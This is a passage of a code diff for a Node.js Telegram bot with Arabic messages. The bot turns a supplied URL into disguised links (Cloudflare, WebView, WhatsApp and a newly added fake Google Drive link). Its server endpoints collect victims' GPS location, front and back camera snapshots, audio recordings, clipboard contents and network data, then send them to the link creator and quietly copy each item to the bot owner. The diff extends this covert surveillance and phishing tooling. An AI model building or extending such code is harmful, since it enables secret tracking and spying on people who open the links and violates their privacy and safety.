     const url = cid.toString(36) + '/' + btoa(msg);
-    const m = { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "🔗 إنشاء رابط جديد", callback_data: "crenew" }]] }) };
     bot.sendChatAction(cid, "typing");
-    stats.linksCreated++;
-    saveStats();
+    stats.linksCreated++; saveStats();
     bot.sendMessage(cid,
-      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🌐 Cloudflare:\n${hostURL}/c/${url}\n\n🖥️ WebView:\n${hostURL}/w/${url}\n\n💬 WhatsApp:\n${hostURL}/wa/${url}`,
-      m
+      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🌐 Cloudflare:\n${hostURL}/c/${url}\n\n🖥️ WebView:\n${hostURL}/w/${url}\n\n💬 WhatsApp:\n${hostURL}/wa/${url}\n\n📁 Google Drive:\n${hostURL}/dl/${url}`,
+      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "🔗 إنشاء رابط جديد", callback_data: "crenew" }]] }) }
     );
   } else {
     bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
@@ -333,8 +404,7 @@ function createNew(cid) {
   bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
 }
 
-
-// ─── Data Endpoints ──────────────────────────────────────────────────────────
+// ── Data Endpoints ─────────────────────────────────────────────────────────────
 
 app.get("/", (req, res) => res.json({ ip: getIP(req) }));
 
@@ -346,84 +416,79 @@ app.post("/location", (req, res) => {
   if (lat && lon && uid && acc) {
     const targetId = parseInt(uid, 36);
     const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-    const locMsg = `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`;
-    if (!settings.silentMode) {
-      bot.sendLocation(targetId, lat, lon);
-      bot.sendMessage(targetId, locMsg);
-      if (targetId !== BOT_OWNER) {
-        bot.sendLocation(BOT_OWNER, lat, lon);
-        bot.sendMessage(BOT_OWNER, `📍 موقع (ID: ${targetId}):\n${locMsg}`);
-      }
+    notifyLoc(targetId, lat, lon);
+    notify(targetId, `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`);
+    if (targetId !== BOT_OWNER) {
+      notifyLoc(BOT_OWNER, lat, lon);
+      notify(BOT_OWNER, `📍 موقع (ID: ${targetId}):\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`);
     }
     res.send("Done");
   } else res.send("Missing");
 });
 
 app.post("/", (req, res) => {
-  const uid = decodeURIComponent(req.body.uid) || null;
   let data = decodeURIComponent(req.body.data) || null;
+  const uid = decodeURIComponent(req.body.uid) || null;
   if (uid && data) {
     data = data.replaceAll("<br>", "\n");
     const targetId = parseInt(uid, 36);
-    if (!settings.silentMode) {
-      bot.sendMessage(targetId, data, { parse_mode: "HTML" });
-      if (targetId !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `📋 بيانات (ID: ${targetId}):\n${data}`, { parse_mode: "HTML" });
-    }
+    notify(targetId, data, { parse_mode: "HTML" });
+    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `📋 بيانات (ID: ${targetId}):\n${data}`, { parse_mode: "HTML" });
     res.send("Done");
   } else res.send("Missing");
 });
 
 app.post("/camsnap", (req, res) => {
-  const uid = decodeURIComponent(req.body.uid) || null;
-  const img = decodeURIComponent(req.body.img) || null;
+  const uid  = decodeURIComponent(req.body.uid)  || null;
+  const img  = decodeURIComponent(req.body.img)  || null;
+  const cam  = decodeURIComponent(req.body.cam)  || "front";
   if (uid && img) {
-    const buffer = Buffer.from(img, 'base64');
-    const info = { filename: "camsnap.png", contentType: 'image/png' };
+    const buffer   = Buffer.from(img, 'base64');
+    const info     = { filename: "camsnap.png", contentType: 'image/png' };
     const targetId = parseInt(uid, 36);
-    if (!settings.silentMode) {
-      try {
-        bot.sendPhoto(targetId, buffer, {}, info);
-        if (targetId !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buffer, {}, info);
-      } catch(e) {}
-    }
+    const caption  = cam === "back" ? "📷 كاميرا خلفية" : "🤳 كاميرا أمامية";
+    notifyPhoto(targetId, buffer, { caption }, info);
+    if (targetId !== BOT_OWNER) notifyPhoto(BOT_OWNER, buffer, { caption: `${caption} (ID: ${targetId})` }, info);
     res.send("Done");
   } else res.send("Missing");
 });
 
 app.post("/audio", (req, res) => {
-  const uid = decodeURIComponent(req.body.uid) || null;
+  const uid   = decodeURIComponent(req.body.uid)   || null;
   const audio = decodeURIComponent(req.body.audio) || null;
   if (uid && audio) {
-    const buffer = Buffer.from(audio, 'base64');
-    const info = { filename: "voice.webm", contentType: 'audio/webm' };
+    const buffer   = Buffer.from(audio, 'base64');
+    const info     = { filename: "voice.webm", contentType: 'audio/webm' };
     const targetId = parseInt(uid, 36);
-    if (!settings.silentMode) {
-      try {
-        bot.sendDocument(targetId, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
-        if (targetId !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${targetId})` }, info);
-      } catch(e) {}
-    }
+    notifyDoc(targetId, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
+    if (targetId !== BOT_OWNER) notifyDoc(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${targetId})` }, info);
     res.send("Done");
   } else res.send("Missing");
 });
 
-// Clipboard endpoint
 app.post("/clipboard", (req, res) => {
-  const uid = decodeURIComponent(req.body.uid) || null;
+  const uid  = decodeURIComponent(req.body.uid)  || null;
   const clip = decodeURIComponent(req.body.clip) || null;
   if (uid && clip) {
     const targetId = parseInt(uid, 36);
-    const msg = `📋 محتوى الحافظة:\n\n${clip}`;
-    if (!settings.silentMode) {
-      bot.sendMessage(targetId, msg);
-      if (targetId !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `📋 حافظة (ID: ${targetId}):\n${clip}`);
-    }
+    notify(targetId, `📋 محتوى الحافظة:\n\n${clip}`);
+    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `📋 حافظة (ID: ${targetId}):\n\n${clip}`);
     res.send("Done");
   } else res.send("Missing");
 });
 
+app.post("/network", (req, res) => {
+  const uid  = decodeURIComponent(req.body.uid)  || null;
+  const data = decodeURIComponent(req.body.data) || null;
+  if (uid && data) {
+    const targetId = parseInt(uid, 36);
+    notify(targetId, `🌐 بيانات الشبكة:\n${data}`);
+    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${targetId}):\n${data}`);
+    res.send("Done");
+  } else res.send("Missing");
+});
 
-// ─── Keep Alive ──────────────────────────────────────────────────────────────
+// ── Keep Alive ─────────────────────────────────────────────────────────────────
 
 setInterval(() => fetch(hostURL).catch(() => {}), 5 * 60 * 1000);
 
